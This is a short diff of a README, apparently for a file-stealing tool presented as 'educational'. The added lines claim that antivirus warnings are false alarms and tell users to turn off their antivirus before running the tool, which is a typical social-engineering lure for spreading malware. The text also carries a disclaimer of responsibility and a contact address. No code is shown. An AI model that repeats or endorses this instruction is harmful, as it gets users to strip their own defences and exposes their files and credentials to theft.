@@ -53,4 +53,7 @@ Please refer to the user manual for detailed function usage methods
 
 This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. Educational purpose only!
 
+
+Due to the use of new libraries, the anti-virus software will falsely report alarms. You need to close the anti-virus software before using it. Please make your own choice.
+
 contact:LanceHez@proton.me
